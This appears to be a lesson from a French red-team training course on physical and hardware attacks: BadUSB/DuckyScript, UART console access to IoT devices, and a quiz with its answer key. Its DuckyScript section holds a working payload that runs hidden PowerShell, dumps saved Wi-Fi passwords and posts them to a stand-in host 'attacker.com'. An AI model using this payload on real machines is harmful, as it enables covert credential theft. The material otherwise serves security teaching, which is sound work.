# TOME P6 — Cybersécurité Expert & Red Team Avancé — Jour 284 (6h) : Physical Security, Hardware Hacking & BadUSB (USB Rubber Ducky Scripting, Flipper Zero, JTAG/UART Protocol Sniffing & Physical Intrusion Testing)

> [!NOTE]
> **Objectif du jour :** Maîtriser les **attaques physiques, le hacking matériel (Hardware Hacking) et les vecteurs d'intrusion BadUSB** : rédiger des scripts de frappe automatisée **DuckyScript** pour Rubber Ducky et Flipper Zero, capturer des bus de données physiques (**UART, JTAG, SPI, I2C**), contourner les contrôles d'accès physiques (Lockpicking, RFID Badging Emulation), et réaliser un audit de sécurité physique complet.
>
> **Compétences visées :** `HARD-01` (A) — BadUSB & DuckyScript Exploitation | `HARD-02` (A) — Hardware Sniffing (UART/JTAG) & RFID Emulation

---

## 1) Module — BadUSB & DuckyScripting (2h)

### 📖 Narration/Intuition

Les attaques **BadUSB** exploitent la confiance implicite accordée par les systèmes d'exploitation aux périphériques de saisie **HID (Human Interface Device)** comme les claviers. Un microcontrôleur malveillant (ex: USB Rubber Ducky, Flipper Zero, MalTron) se fait passer pour un clavier physique ultra-rapide et injecte des centaines de touches par seconde pour ouvrir un terminal et télécharger une porte dérobée.

---

## 2) Module — Scripting DuckyScript 3.0 (`payload_badusb.txt`) (2h)

### 🛠️ Script DuckyScript d'exfiltration de mots de passe Wi-Fi

```text
REM ═══════════════════════════════════════════════════════
REM DuckyScript 3.0 — Rubber Ducky / Flipper Zero Payload
REM Target: Windows 10/11
REM Function: Exfiltrer les mots de passe Wi-Fi vers un serveur distant en 3 secondes
REM ═══════════════════════════════════════════════════════

DEFAULT_DELAY 100

REM Ouvrir l'invite de commande de manière furtive via PowerShell masqué
GUI r
DELAY 200
STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command "netsh wlan show profiles * key=clear | Out-File $env:TEMP\wifi.txt; Invoke-RestMethod -Uri 'http://attacker.com/log' -Method Post -InFile $env:TEMP\wifi.txt; Remove-Item $env:TEMP\wifi.txt"
ENTER
```

---

## 3) Module — Interception de Bus Matériels (UART / JTAG) (2h)

### 🛠️ Connexion et Dumper de Firmware via UART (`uart_sniffing.sh`)

```bash
# ═══════════════════════════════════════════════════════
# ÉTAPE 1 — Identification des broches UART sur un équipement IoT (Routeur/Caméra)
# Broches clés : TX (Transmit), RX (Receive), GND (Ground), VCC (3.3V/5V)
# ═══════════════════════════════════════════════════════

# Utiliser un convertisseur USB-to-TTL (ex: FTDI FT232RL ou Bus Pirate)
# Connecter GND -> GND, TX -> RX, RX -> TX

# ═══════════════════════════════════════════════════════
# ÉTAPE 2 — Connexion au Shell Root Série via Screen / Minicom
# ═══════════════════════════════════════════════════════
# Vitesse de transmission standard (Baudrate) : 115200 bps
sudo minicom -D /dev/ttyUSB0 -b 115200

# Résultat : Accès direct au Shell Root BusyBox du routeur sans authentification !
# # id
# uid=0(root) gid=0(root)
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **HID** | Human Interface Device — Classe de périphériques USB (claviers, souris) auto-approuvés |
| **UART** | Universal Asynchronous Receiver-Transmitter — Bus de communication série bas niveau |
| **JTAG** | Joint Test Action Group — Interface de débogage et de test matériel au niveau puce |
| **Flipper Zero** | Outil multi-usage d'analyse des protocoles radio, RFID, NFC et BadUSB |

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Pourquoi les attaques de type **BadUSB** (ex: USB Rubber Ducky) contournent-elles la majorité des pare-feux et antivirus traditionnels ?
- A) Parce que la clé USB est reconnue par le système d'exploitation comme un **clavier physique (HID)** légitime, qui possède le droit d'envoyer des commandes de saisie sans alerte
- B) Parce qu'elle détruit le port USB
- C) Parce qu'elle utilise du Wi-Fi
- D) Parce qu'elle modifie le Bios

**Réponse : A**

**Q2 :** Quel bus de communication série matériel, présent sous forme de broches sur les cartes électroniques des équipements IoT, permet souvent d'obtenir un **Shell Root direct** lors des démarrages de bootloader (U-Boot) ?
- A) UART (Universal Asynchronous Receiver-Transmitter)
- B) HDMI
- C) SATA
- D) PCIe

**Réponse : A**

**Q3 :** Quel outil moderne et populaire intègre dans un boîtier portable l'analyse des signaux Sub-GHz, l'émulation de badges RFID/NFC et les fonctions BadUSB ?
- A) Flipper Zero
- B) Raspberry Pi
- C) Rubber Ducky
- D) Arduino

**Réponse : A**

**Q4 :** Dans la syntaxe DuckyScript, quelle commande simule l'appui simultané sur la touche "Touche Windows" + "R" pour ouvrir la fenêtre Exécuter sous Windows ?
- A) `GUI r` (ou `WINDOWS r`)
- B) `ALT F4`
- C) `CTRL ALT DEL`
- D) `ENTER`

**Réponse : A**

**Q5 :** Quel est le Baudrate (vitesse de transmission série en bauds) le plus fréquemment utilisé par défaut pour se connecter à une console série UART IoT ?
- A) 115200 bps
- B) 9600 bps
- C) 4800 bps
- D) 1000000 bps

**Réponse : A**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
